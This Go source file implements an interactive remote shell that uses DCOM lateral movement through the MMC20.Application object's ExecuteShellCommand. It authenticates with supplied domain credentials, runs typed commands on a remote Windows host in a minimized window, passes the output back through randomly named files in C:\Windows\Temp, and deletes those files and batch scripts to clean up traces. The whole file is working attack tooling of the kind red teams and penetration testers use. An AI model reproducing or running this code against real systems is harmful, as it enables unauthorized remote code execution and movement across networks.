package main

import (
	"bufio"
	"fmt"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"log"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

func handleDCOMSession(target string, username string, password string, domain string, batch bool, method string) {
	fmt.Printf("Handling DCOM session for target: %s\n", target)
	settings := &Settings{
		User:          fmt.Sprintf("%s\\%s", domain, username),
		Password:      password,
		TargetShare:   "ADMIN$",
		Target:        target,
		UserSpecified: false,
	}
	if username != "" {
		settings.UserSpecified = true
	}

	if !EstablishConnection(settings, "C$", true) {
		fmt.Printf("failed to establish connection to C$ share on %s", settings.Target)
		return
	}
	defer EstablishConnection(settings, "C$", false)
	log.Printf("Successfully connected to C$ share on %s\n", target)

	for true {
		fmt.Printf("dcom@%s: ", target)
		var command string
		scanner := bufio.NewScanner(os.Stdin)
		if scanner.Scan() {
			command = scanner.Text()
		}
		if command == "exit" {
			fmt.Println("quitting...")
			break
		}
		if command == "" {
			fmt.Println()
			continue
		}
		outputFile := fmt.Sprintf("\\\\%s\\C$\\Windows\\Temp\\%s.txt", target, getRandomString(18))
		outputSignalFile := fmt.Sprintf("\\\\%s\\C$\\Windows\\Temp\\%s.txt", target, getRandomString(18))
		//cmd := fmt.Sprintf("cmd.exe /c %s > %s 2>&1 & echo 1 > %s", command, outputFile, outputSignalFile)
		cmd := fmt.Sprintf("\"%s > %s 2>&1 & echo 1 > %s\"", command, outputFile, outputSignalFile)
		batchFile := fmt.Sprintf("\\\\%s\\C$\\Windows\\Temp\\%s.bat", target, getRandomString(18))
		if batch {
			// Make a batch file on the target at C:\Windows\Temp and then we will pass a command to execute this
			f, err := os.Create(batchFile)
			if err != nil {
				fmt.Println(err.Error())
				continue
			}
			f.WriteString(cmd)
			f.Close()
			cmd = fmt.Sprintf("%s", batchFile)
		}
		var err error
		if method == "mmc20" {
			err = executeMMCLateralMovement(username, password, domain, target, cmd)
		}
		if err != nil {
			fmt.Println(err.Error())
			continue
		} else {
			// Now we enter a subloop and wait to find outputSignalFile on the target - this signals that we are ready to read output, then we delete both
			// Another approach here would be just using the PID and checking periodically to see if the process is still running
			for true {
				time.Sleep(1 * time.Second)
				// Check if outputSignalFile exists
				if !checkExists(outputSignalFile) {
					continue
				}
				c, err := readFileToSlice(outputFile)
				if err != nil {
					fmt.Println(err.Error())
					err := deleteFile(outputSignalFile)
					if err != nil {
						fmt.Println(err.Error())
					}
					err = deleteFile(outputFile)
					if err != nil {
						fmt.Println(err.Error())
					}
					break
				}
				for _, v := range c {
					fmt.Println(v)
				}
				err = deleteFile(outputSignalFile)
				if err != nil {
					fmt.Println(err.Error())
				}
				err = deleteFile(outputFile)
				if err != nil {
					fmt.Println(err.Error())
				}
				if batch {
					err = deleteFile(batchFile)
					if err != nil {
						fmt.Println(err.Error())
					}
				}
				break

			}
		}
	}
}

// executeMMCLateralMovement executes a command on a remote system using MMC20.Application COM object
func executeMMCLateralMovement(username, password, domain, targetHost, command string) error {

	// Lock the thread for COM operations
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	hr, _, _ := procCoInitializeEx.Call(0, uintptr(ole.COINIT_MULTITHREADED))
	if hr != 0 && hr != 0x80010106 { // S_OK or S_FALSE (already initialized)
		return fmt.Errorf("failed to initialize COM: 0x%X", hr)
	}
	defer procCoUninitialize.Call()

	// Initialize COM Security with proper authentication level
	hr, _, _ = procCoInitializeSecurity.Call(
		0,                                        // Security descriptor (NULL)
		uintptr(0xFFFFFFFF),                      // -1, let COM choose
		0,                                        // Authentication services (NULL)
		0,                                        // Reserved
		uintptr(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY), // Required since DCOM hardening
		uintptr(RPC_C_IMP_LEVEL_IMPERSONATE),     // Default impersonation level
		0,                                        // Identity (NULL)
		uintptr(EOAC_DYNAMIC_CLOAKING),           // Allow impersonation across thread boundaries
		0)                                        // Additional capabilities (NULL)

	if hr != 0 && hr != 0x80010119 { // S_OK or RPC_E_TOO_LATE (security already initialized)
		return fmt.Errorf("failed to initialize COM security: 0x%X", hr)
	}

	// Get CLSID for MMC20.Application
	clsid, err := CLSIDFromProgID("MMC20.Application")
	if err != nil {
		// Try alternate ProgID
		clsid, err = CLSIDFromProgID("MMC20.Application.1")
		if err != nil {
			return fmt.Errorf("failed to get CLSID for MMC20.Application: %v", err)
		}
	}

	// Create authentication identity structure for the credentials
	var authIdentity SEC_WINNT_AUTH_IDENTITY_W

	// Format credentials
	var domainStr, usernameStr string
	if domain != "" {
		domainStr = domain
		usernameStr = username
	} else {
		// Use only username if no domain provided
		domainStr = ""
		usernameStr = username
	}

	// Convert strings to UTF16
	domainPtr, err := syscall.UTF16FromString(domainStr)
	if err != nil {
		return fmt.Errorf("failed to convert domain to UTF16: %v", err)
	}

	usernamePtr, err := syscall.UTF16FromString(usernameStr)
	if err != nil {
		return fmt.Errorf("failed to convert username to UTF16: %v", err)
	}

	passwordPtr, err := syscall.UTF16FromString(password)
	if err != nil {
		return fmt.Errorf("failed to convert password to UTF16: %v", err)
	}

	// Set up identity structure
	if len(domainPtr) > 0 {
		authIdentity.Domain = &domainPtr[0]
		authIdentity.DomainLength = uint32(len(domainPtr) - 1) // -1 to exclude null terminator
	}
	authIdentity.User = &usernamePtr[0]
	authIdentity.UserLength = uint32(len(usernamePtr) - 1)
	authIdentity.Password = &passwordPtr[0]
	authIdentity.PasswordLength = uint32(len(passwordPtr) - 1)
	authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE

	authInfo := COAUTHINFO{
		dwAuthnSvc:           RPC_C_AUTHN_WINNT,
		dwAuthzSvc:           RPC_C_AUTHZ_NONE,
		pwszServerPrincName:  nil,
		dwAuthnLevel:         RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
		dwImpersonationLevel: RPC_C_IMP_LEVEL_IMPERSONATE,
		pAuthIdentityData:    uintptr(unsafe.Pointer(&authIdentity)),
		dwCapabilities:       EOAC_NONE,
	}

	serverNamePtr, err := syscall.UTF16PtrFromString(targetHost)
	if err != nil {
		return fmt.Errorf("failed to convert server name to UTF16: %v", err)
	}
	serverInfo := COSERVERINFO{
		dwReserved1: 0,
		pwszName:    serverNamePtr,
		pAuthInfo:   uintptr(unsafe.Pointer(&authInfo)),
		dwReserved2: 0,
	}

	// Set up the interface query
	// We need to use a local copy of the GUID to avoid type issues
	iid := ole.GUID{
		Data1: ole.IID_IDispatch.Data1,
		Data2: ole.IID_IDispatch.Data2,
		Data3: ole.IID_IDispatch.Data3,
		Data4: ole.IID_IDispatch.Data4,
	}

	qi := MULTI_QI{
		iid:     &iid,
		punk:    0,
		hresult: 0,
	}

	// Create the instance on the remote server
	hr = CoCreateInstanceEx(
		clsid,                // CLSID of the object
		nil,                  // Not part of an aggregate
		CLSCTX_REMOTE_SERVER, // Want to run on remote server
		&serverInfo,          // The remote server
		1,                    // Just one interface
		&qi,                  // The interface we want
	)

	if hr != 0 {
		return fmt.Errorf("CoCreateInstanceEx failed: 0x%X", hr)
	}

	if qi.hresult != 0 {
		return fmt.Errorf("failed to get IDispatch interface: 0x%X", qi.hresult)
	}

	if qi.punk == 0 {
		return fmt.Errorf("received null IDispatch pointer")
	}

	disp := (*ole.IDispatch)(unsafe.Pointer(qi.punk))
	defer disp.Release()

	// Set the proxy blanket for the IDispatch interface
	// This is essential for remote calls to work properly with authentication
	hr = setProxyBlanket(uintptr(unsafe.Pointer(disp)),
		RPC_C_AUTHN_WINNT,               // Authentication service
		RPC_C_AUTHZ_NONE,                // Authorization service
		nil,                             // Server principal name
		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
		RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
		&authIdentity,                   // Authentication identity
		EOAC_NONE)                       // Capabilities

	if hr != 0 {
		return fmt.Errorf("failed to set proxy blanket on IDispatch: 0x%X", hr)
	}

	// Navigate through the object hierarchy: MMC20.Application -> Document -> ActiveView
	document, err := oleutil.GetProperty(disp, "Document")
	if err != nil {
		return fmt.Errorf("failed to get Document property: %v", err)
	}
	defer document.Clear()

	documentDisp := document.ToIDispatch()
	if documentDisp == nil {
		return fmt.Errorf("document dispatch is nil")
	}

	// Set proxy blanket for the Document interface
	hr = setProxyBlanket(uintptr(unsafe.Pointer(documentDisp)),
		RPC_C_AUTHN_WINNT,               // Authentication service
		RPC_C_AUTHZ_NONE,                // Authorization service
		nil,                             // Server principal name
		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
		RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
		&authIdentity,                   // Authentication identity
		EOAC_NONE)                       // Capabilities

	if hr != 0 {
		return fmt.Errorf("failed to set proxy blanket on Document: 0x%X", hr)
	}

	activeView, err := oleutil.GetProperty(documentDisp, "ActiveView")
	if err != nil {
		return fmt.Errorf("failed to get ActiveView property: %v", err)
	}
	defer activeView.Clear()

	activeViewDisp := activeView.ToIDispatch()
	if activeViewDisp == nil {
		return fmt.Errorf("activeView dispatch is nil")
	}

	// Set proxy blanket for the ActiveView interface
	hr = setProxyBlanket(uintptr(unsafe.Pointer(activeViewDisp)),
		RPC_C_AUTHN_WINNT,               // Authentication service
		RPC_C_AUTHZ_NONE,                // Authorization service
		nil,                             // Server principal name
		RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, // Authentication level
		RPC_C_IMP_LEVEL_IMPERSONATE,     // Impersonation level
		&authIdentity,                   // Authentication identity
		EOAC_NONE)                       // Capabilities

	if hr != 0 {
		return fmt.Errorf("failed to set proxy blanket on ActiveView: 0x%X", hr)
	}

	// Call the ExecuteShellCommand method on the ActiveView object
	// Parameters:
	// 1. Command - The executable to run (e.g., cmd.exe)
	// 2. Directory - Working directory (null/nil for default)
	// 3. Parameters - Command line parameters
	// 4. WindowState - Display mode (7 for SW_SHOWMINNOACTIVE - minimized but not activated)
	_, err = oleutil.CallMethod(activeViewDisp, "ExecuteShellCommand", "cmd.exe", "", "/c "+command, "7")
	if err != nil {
		return fmt.Errorf("failed to execute shell command: %v", err)
	}

	fmt.Printf("Command executed successfully on %s\n", targetHost)
	return nil
}

// CLSIDFromProgID gets the CLSID for a ProgID
func CLSIDFromProgID(progID string) (clsid *ole.GUID, err error) {
	clsid = new(ole.GUID)
	lpszProgID, err := syscall.UTF16PtrFromString(progID)
	if err != nil {
		return nil, err
	}

	hr, _, _ := procCLSIDFromProgID.Call(
		uintptr(unsafe.Pointer(lpszProgID)),
		uintptr(unsafe.Pointer(clsid)),
	)

	if hr != 0 {
		return nil, fmt.Errorf("CLSIDFromProgID failed with code: 0x%X", hr)
	}

	return clsid, nil
}

// CoCreateInstanceEx creates a COM object on a possibly remote server
func CoCreateInstanceEx(clsid *ole.GUID, outer *ole.IUnknown, clsContext uint32, server *COSERVERINFO, countQI uint32, pResults *MULTI_QI) (hresult uintptr) {
	hresult, _, _ = procCoCreateInstanceEx.Call(
		uintptr(unsafe.Pointer(clsid)),
		uintptr(unsafe.Pointer(outer)),
		uintptr(clsContext),
		uintptr(unsafe.Pointer(server)),
		uintptr(countQI),
		uintptr(unsafe.Pointer(pResults)),
	)
	return
}

// setProxyBlanket configures security settings for a COM proxy
func setProxyBlanket(punk uintptr,
	dwAuthnSvc uint32,
	dwAuthzSvc uint32,
	pServerPrincName *uint16,
	dwAuthnLevel uint32,
	dwImpLevel uint32,
	pAuthInfo *SEC_WINNT_AUTH_IDENTITY_W,
	dwCapabilities uint32) (hresult uintptr) {

	hresult, _, _ = procCoSetProxyBlanket.Call(
		punk,
		uintptr(dwAuthnSvc),
		uintptr(dwAuthzSvc),
		uintptr(unsafe.Pointer(pServerPrincName)),
		uintptr(dwAuthnLevel),
		uintptr(dwImpLevel),
		uintptr(unsafe.Pointer(pAuthInfo)),
		uintptr(dwCapabilities),
	)
	return
}
